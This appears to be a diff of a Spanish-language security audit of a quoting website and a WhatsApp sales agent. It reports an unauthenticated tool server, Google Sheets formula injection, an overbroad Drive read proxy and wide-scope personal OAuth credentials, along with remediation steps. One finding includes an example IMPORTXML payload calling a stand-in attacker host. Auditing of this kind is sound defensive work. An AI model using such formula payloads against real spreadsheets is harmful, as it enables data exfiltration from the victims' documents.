@@ -1,9 +1,176 @@
 # Análisis de ciberseguridad y seguridad digital — Isa
 
-Revisión de configuración y código fuente sobre el cotizador web
-(`espazios-web`) y el flujo de WhatsApp de Isa (proyecto Kapso "Prueba Leads
-Ventas EZ"). **No incluye pentesting activo** — es la base para priorizar
-remediaciones y, si se quiere, encargar una prueba de penetración dirigida.
+Revisión de configuración y código fuente sobre **dos repositorios**:
+`espazios/espazios-web` (cotizador web + Decap CMS) y
+`espazios/espazios-whatsapp-agent` (Isa v2, agente generativo + servidor de
+herramientas), más el proyecto Kapso "Prueba Leads Ventas EZ" que opera Isa
+en WhatsApp. **No incluye pentesting activo** — es la base para priorizar
+remediaciones y, si se quiere, encargar una prueba de penetración dirigida,
+empezando por los hallazgos críticos de la siguiente sección.
+
+## ⚠️ Hallazgos críticos y altos — `espazios-whatsapp-agent`
+
+Este repositorio es **público** en GitHub y su servidor de herramientas
+(`src/tools-server.ts`) ya está desplegado en una URL real de Railway
+(nombrada en el propio `CLAUDE.md` del repo). Aunque Isa v2 todavía está en
+Sandbox y no atiende clientes reales, **el servidor HTTP sí está en
+producción y es alcanzable por cualquiera en internet ahora mismo** —
+estos hallazgos no dependen de que Isa v2 salga de pruebas.
+
+### Hallazgo CRÍTICO-1 — `tools-server.ts` no autentica ninguna petición
+
+**Dónde:** `src/tools-server.ts` — todas las rutas (`/tools/generar-cotizacion`,
+`/tools/estimado-ilustrativo`, `/tools/detalle-paquete`,
+`/tools/cotizaciones/:fileId`).
+
+Ninguna ruta valida un API key, firma de webhook, ni ningún otro secreto
+compartido con Kapso. El diseño asume implícitamente que solo el `agent
+node` de Kapso va a llamarlas, pero al estar publicadas en una URL fija de
+Railway sin control de acceso, **cualquiera con la URL puede invocarlas
+directamente** — sin pasar por WhatsApp, sin ser cliente, sin que exista
+siquiera una conversación.
+
+**Impacto:** es la puerta de entrada a todos los demás hallazgos de esta
+sección — consumo no controlado de cuota de Google APIs (costo/disponibilidad),
+generación masiva de archivos basura en el Drive real de la empresa, y el
+vector de inyección de CRÍTICO-2.
+
+**Recomendación:** exigir un header compartido (`Authorization: Bearer
+<secreto>` o similar) validado en cada ruta antes de procesar la petición.
+Kapso soporta configurar headers personalizados en sus *webhook tools* — es
+cuestión de configurarlo en ambos lados. Complementar con rate limiting
+(esta vez sí en un store compartido, no en memoria — ver hallazgo ALTO-2 de
+`espazios-web` para el mismo error) y con `PUBLIC_BASE_URL` como algo que
+no se anuncie en documentación pública (ver MEDIO-5, abajo).
+
+### Hallazgo CRÍTICO-2 — Inyección de fórmulas en Google Sheets
+
+**Dónde:** `src/tools/cotizador/generate-quote.ts`, `sheets.spreadsheets.values.batchUpdate` con `valueInputOption: "USER_ENTERED"`.
+
+```js
+await sheets.spreadsheets.values.batchUpdate({
+  spreadsheetId,
+  requestBody: {
+    valueInputOption: "USER_ENTERED",
+    data: (...).map((field) => ({ range: INPUT_CELL_MAP[field], values: [[input[field]]] })),
+  },
+});
+```
+
+`input` viene directo del body de `POST /tools/generar-cotizacion` — hoy
+sin ninguna sanitización. `USER_ENTERED` le dice a la API de Sheets que
+interprete el valor **igual que si un humano lo hubiera tecleado en la
+celda**: un valor que empiece con `=`, `+`, `-` o `@` se ejecuta como
+fórmula. Combinado con CRÍTICO-1 (el endpoint es público), cualquiera puede
+mandar, por ejemplo, `clienteNombre: "=IMPORTXML(\"https://atacante.example/x\",\"//a\")"`
+y esa fórmula queda viva en una hoja de cálculo real dentro del Drive de la
+empresa — se ejecuta apenas alguien del equipo (el Ejecutivo Comercial) la
+abra. Es la clase de vulnerabilidad conocida como *CSV/Formula Injection*
+(OWASP), aplicada aquí sobre Google Sheets en vez de un CSV exportado.
+
+**Impacto potencial:** filtración de datos de la hoja hacia un servidor de
+terceros (`IMPORTXML`/`IMPORTDATA`/`IMPORTFEED`), enlaces de phishing
+insertados en documentos que el equipo comercial trata como oficiales, o
+simple corrupción/vandalismo de las cotizaciones generadas. La función
+`generar_cotizacion` está "dormida" en el guion de conversación de Isa v2
+(no se automatiza todavía, según `CLAUDE.md`), **pero la ruta HTTP existe y
+responde igual** — la explotación no depende de que Isa la use.
+
+**Recomendación:**
+- Cambiar a `valueInputOption: "RAW"` — inserta el valor literal, sin
+  interpretarlo como fórmula. Es el fix de una línea para el riesgo
+  principal.
+- Como defensa adicional, sanitizar cualquier valor que empiece con
+  `=`, `+`, `-` o `@` (anteponer un apóstrofo o un espacio) antes de
+  escribirlo, incluso con `RAW`, por si en el futuro alguna ruta vuelve a
+  usar `USER_ENTERED` a propósito.
+- No depender de que la función esté "dormida" como mitigación — arreglarlo
+  ahora, ya que el endpoint ya es alcanzable.
+
+### Hallazgo ALTO-4 — `/tools/cotizaciones/:fileId` como proxy de lectura de Drive de alcance amplio
+
+**Dónde:** `src/tools/cotizador/generate-quote.ts` (`getQuotePdfBytes`) +
+`src/lib/google-auth.ts` (scope `https://www.googleapis.com/auth/drive`,
+no el más acotado `drive.file`).
+
+`GET /tools/cotizaciones/:fileId` toma el `fileId` de la URL sin validarlo
+contra una lista de archivos generados por el propio servidor, y lo
+descarga con `drive.files.get({ fileId, alt: "media" })` usando las
+credenciales del sistema. Como el scope es `drive` completo (no
+`drive.file`, que limitaría el acceso solo a archivos creados por esta
+misma app), en la práctica esta ruta puede servir como **proxy de lectura
+de cualquier archivo al que la cuenta de Google tenga acceso** — no solo
+los PDFs de cotización — a quien sea que mande un `fileId` válido, sin
+autenticación (ver CRÍTICO-1). Los IDs de Drive no son triviales de
+adivinar a ciegas, pero tampoco son secretos: circulan en enlaces
+compartidos, y en este caso la propia app expone varios en sus respuestas
+JSON (`spreadsheetUrl`, `pdfDriveFileId`).
+
+**Recomendación:** además de resolver CRÍTICO-1, reducir el scope a
+`drive.file` (acceso solo a archivos creados por la app) y llevar un
+registro propio (los `fileId` que el servidor generó) contra el cual
+validar cada solicitud de descarga, en vez de confiar ciegamente en
+cualquier `fileId` recibido.
+
+### Hallazgo ALTO-5 — Credenciales de Google: cuenta personal con scopes amplios
+
+**Dónde:** `src/lib/google-auth.ts`.
+
+```js
+const SCOPES = [
+  "https://www.googleapis.com/auth/drive",
+  "https://www.googleapis.com/auth/spreadsheets",
+  "https://www.googleapis.com/auth/calendar",
+  "https://www.googleapis.com/auth/gmail.send",
+];
+```
+
+Según `CLAUDE.md`, la política del proyecto de Google Cloud bloquea la
+creación de llaves de cuenta de servicio, así que se optó por credenciales
+OAuth de **una cuenta personal** (`espazios.co@gmail.com`,
+`"type": "authorized_user"`) con los cuatro scopes de arriba. Ese JSON viaja
+como variable de entorno (`GOOGLE_SERVICE_ACCOUNT_JSON`) en Railway.
+
+**Impacto:** si ese JSON se filtra (log mal configurado, variable de
+entorno expuesta, backup sin cifrar), el radio de exposición es mucho mayor
+que el de una identidad de servicio acotada — es acceso de una cuenta
+personal real, con capacidad de **enviar correo en su nombre**
+(`gmail.send`, scope que además no se usa en ningún lugar del código
+revisado — no hay una sola llamada a la API de Gmail), leer/escribir en
+todo Drive al que esa persona tenga acceso, y su Calendar. Además, al ser
+credenciales atadas a una persona (no a una identidad de máquina), quedan
+sujetas a que se revoque el refresh token si esa persona cambia su
+contraseña o revisa sus apps conectadas — riesgo de disponibilidad, no solo
+de confidencialidad, ya anotado como aceptado en el propio `CLAUDE.md`.
+
+**Recomendación:**
+- Quitar `gmail.send` de los `SCOPES` mientras no haya una funcionalidad
+  real que lo use (principio de mínimo privilegio).
+- Si la política de la organización de Google Cloud lo permite más
+  adelante, migrar a una cuenta de servicio dedicada. Mientras tanto,
+  considerar una cuenta de Google Workspace *dedicada al bot* (no la cuenta
+  personal del fundador) para reducir el radio de exposición si el JSON se
+  filtra.
+
+### Hallazgo MEDIO-5 — Repositorio público con detalle operativo de producción
+
+**Dónde:** repositorio `espazios/espazios-whatsapp-agent` completo (visibilidad **pública** en GitHub), especialmente `CLAUDE.md`.
+
+El repo es público y su bitácora de ingeniería (`CLAUDE.md`, ~25 KB) documenta,
+entre otras cosas: la URL real de producción en Railway, el ID del proyecto
+de Google Cloud, el Client ID de OAuth usado, el enlace directo a la hoja de
+cálculo "Tarifas Ilustrativas" en producción, y comparaciones detalladas de
+precios contra un competidor nombrado explícitamente (Tervi). Nada de esto
+es una credencial en sí misma, pero en conjunto **reduce a casi cero el
+trabajo de reconocimiento** que necesitaría alguien para explotar
+CRÍTICO-1/CRÍTICO-2/ALTO-4/ALTO-5 — todo lo que hace falta para intentarlo
+ya está publicado.
+
+**Recomendación:** evaluar si el repo necesita ser público (¿portafolio,
+open source deliberado?); si no, pasarlo a privado. Si se mantiene público
+por alguna razón, al menos mover la bitácora operativa (`CLAUDE.md`) a un
+lugar no versionado en el repo público, o purgar los identificadores de
+infraestructura una vez cada hallazgo de esta sección esté resuelto.
 
 ## Aspectos positivos encontrados
 
@@ -23,8 +190,25 @@ remediaciones y, si se quiere, encargar una prueba de penetración dirigida.
   CI (`ci.yml`) que corre `astro check`, tests unitarios y build en cada PR
   contra `main`.
 - Rutas `/api/*` y `/admin/*` marcadas `no-store` y `noindex, nofollow`.
+- **`espazios-whatsapp-agent`:** `.gitignore`/`.dockerignore` correctos
+  (`secrets/`, `.env`, `*.key.json` excluidos) — no se encontró ningún
+  secreto versionado en el repo, pese a la exposición de `CLAUDE.md`.
+- **`espazios-whatsapp-agent`:** manejo de errores consistente en
+  `tools-server.ts` — nunca se devuelve el stack trace ni detalle interno
+  al llamador, solo mensajes genéricos.
+- **`espazios-whatsapp-agent`:** los IDs de las imágenes generadas
+  (`/tools/estimados/:id`) usan `randomUUID()` (criptográficamente fuerte),
+  a diferencia del `leadId` de `espazios-web` (ver MEDIO-4).
+- **`espazios-whatsapp-agent`:** el system prompt de Isa v2 es explícito en
+  que **el modelo nunca redacta un precio en texto libre** — siempre viene
+  de una fórmula ya calculada — lo que limita el riesgo de alucinación de
+  cifras hacia el cliente.
+- **`espazios-whatsapp-agent`:** el aviso de tratamiento de datos (Ley
+  1581/2012) está integrado en el segundo mensaje del guion de Isa v2,
+  antes de pedir cualquier dato — mejora directa sobre el hallazgo INFO-2
+  observado en el flujo v1 actualmente en producción.
 
-## Hallazgos
+## Hallazgos — `espazios-web` (cotizador + Decap CMS)
 
 | ID | Severidad | Componente | Hallazgo |
 |---|---|---|---|
@@ -216,29 +400,41 @@ explícitamente como no utilizada.
 
 No se encontró, ni en el repo ni en la configuración de Kapso inspeccionada
 (`whatsapp_webhooks` está vacío), evidencia de que los leads capturados por
-Isa en WhatsApp lleguen al mismo HubSpot que usa el cotizador web. Esto no es
+Isa en WhatsApp lleguen al mismo HubSpot que usa el cotizador web. El propio
+`CLAUDE.md` de `espazios-whatsapp-agent` lo confirma sin ambigüedad en su
+checklist de pendientes: `sync_hubspot: falta construir`. Esto no es
 una vulnerabilidad de seguridad en sí, pero sí un riesgo de **gobierno de
-datos**: dos fuentes de verdad para el mismo cliente, sin deduplicación, y
-sin que quede claro dónde vive el registro de consentimiento de cada canal.
+datos**: tres fuentes de verdad distintas para el mismo cliente potencial
+(HubSpot, la conversación de Kapso v1, y eventualmente Isa v2), sin
+deduplicación, y sin que quede claro dónde vive el registro de
+consentimiento de cada canal.
 
 **Recomendación:** confirmar con el equipo si existe una integración fuera
 del alcance revisado; si no existe, evaluar un webhook Kapso → `/api/lead`
 (o directo a HubSpot) para unificar el embudo.
 
-### Hallazgo INFO-2 — Habeas Data no verificado en WhatsApp
+### Hallazgo INFO-2 — Habeas Data no verificado en el flujo de WhatsApp en producción (Isa v1)
 
-**Dónde:** flujo "Precalificación Leads EZ" (Kapso).
+**Dónde:** flujo "Precalificación Leads EZ" (Kapso) — el que atiende
+clientes reales hoy.
 
 El cotizador web bloquea el envío a HubSpot si falta el consentimiento
-explícito (Ley 1581 de 2012). En las conversaciones de WhatsApp revisadas no
-se observó un mensaje equivalente de aviso de tratamiento de datos antes de
-solicitar nombre, correo o presupuesto — puede existir en un paso no cubierto
-por la muestra revisada, pero conviene confirmarlo explícitamente dado que es
-el mismo tipo de dato personal capturado por el otro canal, que sí lo exige.
+explícito (Ley 1581 de 2012). En las conversaciones de WhatsApp revisadas
+(canal v1, en producción) no se observó un mensaje equivalente de aviso de
+tratamiento de datos antes de solicitar nombre, correo o presupuesto — puede
+existir en un paso no cubierto por la muestra revisada, pero conviene
+confirmarlo explícitamente dado que es el mismo tipo de dato personal
+capturado por el otro canal, que sí lo exige. **Nota:** el prompt de Isa v2
+(todavía en Sandbox, no en producción) sí incluye este aviso desde el
+segundo mensaje de la conversación — ver sección 3 de
+[`01-diagramas-funcionales.md`](./01-diagramas-funcionales.md#3-isa-v2--agente-generativo-sandbox-espazios-whatsapp-agent)
+— así que el gap real es solo mientras v1 siga siendo el flujo en
+producción.
 
 **Recomendación:** agregar un mensaje de aviso de tratamiento de datos (con
-enlace a la política de privacidad) como uno de los primeros pasos del flujo
-de WhatsApp, igual que en el cotizador web.
+enlace a la política de privacidad) al flujo v1 mientras siga en producción,
+y verificar que el aviso de Isa v2 quede igual de presente cuando se haga
+el corte de producción hacia la versión nueva.
 
 ### Hallazgo INFO-3 — Nombre real y ruta local en documentación
 
@@ -255,23 +451,35 @@ inventario de datos, no como hallazgo de explotación.
 
 ## Cumplimiento — Ley 1581 de 2012 (Habeas Data, Colombia)
 
-| Requisito | Canal web | Canal WhatsApp |
-|---|---|---|
-| Aviso/autorización previa al tratamiento | ✅ Checkbox explícito + bloqueo server-side | ⚠️ No confirmado (ver INFO-2) |
-| Finalidad declarada del tratamiento | ✅ "usar mi información para contactarme sobre esta cotización" | ⚠️ No observado en la muestra revisada |
-| Registro de fecha de consentimiento | ✅ `fechaConsentimiento` (ISO) persistido junto al lead | ⚠️ No aplica actualmente |
-| Enlace a política de privacidad | ✅ `/politica-privacidad` | ⚠️ No observado |
+| Requisito | Canal web | WhatsApp · Isa v1 (producción) | WhatsApp · Isa v2 (Sandbox) |
+|---|---|---|---|
+| Aviso/autorización previa al tratamiento | ✅ Checkbox explícito + bloqueo server-side | ⚠️ No confirmado (ver INFO-2) | ✅ En el segundo mensaje del guion |
+| Finalidad declarada del tratamiento | ✅ "usar mi información para contactarme sobre esta cotización" | ⚠️ No observado en la muestra revisada | ✅ Referencia explícita a la Ley 1581 |
+| Registro de fecha de consentimiento | ✅ `fechaConsentimiento` (ISO) persistido junto al lead | ⚠️ No aplica actualmente | ⚠️ No verificado en el código revisado |
+| Enlace a política de privacidad | ✅ `/politica-privacidad` | ⚠️ No observado | ⚠️ No observado en el prompt |
 
 ## Hoja de ruta sugerida (por esfuerzo/impacto)
 
+0. **Antes que nada — `espazios-whatsapp-agent` (ya expuesto en internet):**
+   agregar autenticación a `tools-server.ts` (CRÍTICO-1) y cambiar
+   `valueInputOption` a `"RAW"` en `generate-quote.ts` (CRÍTICO-2). Son dos
+   cambios acotados (un middleware + una constante) que cierran la
+   superficie de ataque más seria encontrada en esta revisión, sin esperar
+   a que Isa v2 salga de Sandbox.
 1. **Quick wins (< 1 día):** `crypto.randomUUID()` para `state` y `leadId`
    (MEDIO-1, MEDIO-4), corregir `base_url` de Decap (MEDIO-3), fijar
    `redirect_uri` a constante (MEDIO-2), eliminar código muerto en
-   `callback.ts` (BAJO-2), `npm audit fix` (parte de ALTO-3).
+   `callback.ts` (BAJO-2), `npm audit fix` (parte de ALTO-3), quitar el
+   scope `gmail.send` no usado (parte de ALTO-5).
 2. **Corto plazo (días):** mover el rate limit de `/api/lead` a un store
    compartido (ALTO-2), acotar/afinar la CSP y evaluar nonces (ALTO-1),
-   limpiar `localStorage` al completar el flujo (BAJO-1).
+   limpiar `localStorage` al completar el flujo (BAJO-1), acotar el scope
+   de Drive a `drive.file` y validar `fileId` contra un registro propio
+   (ALTO-4), evaluar si `espazios-whatsapp-agent` debe seguir siendo
+   público (MEDIO-5).
 3. **A planificar:** upgrade de Astro para resolver la CVE de `sharp`
    (ALTO-3), confirmar y documentar (o construir) la integración
    WhatsApp → CRM (INFO-1), agregar aviso de tratamiento de datos al flujo
-   de WhatsApp (INFO-2).
+   de WhatsApp v1 mientras siga en producción (INFO-2), migrar de OAuth de
+   cuenta personal a una identidad de servicio dedicada cuando la política
+   de Google Cloud lo permita (ALTO-5).
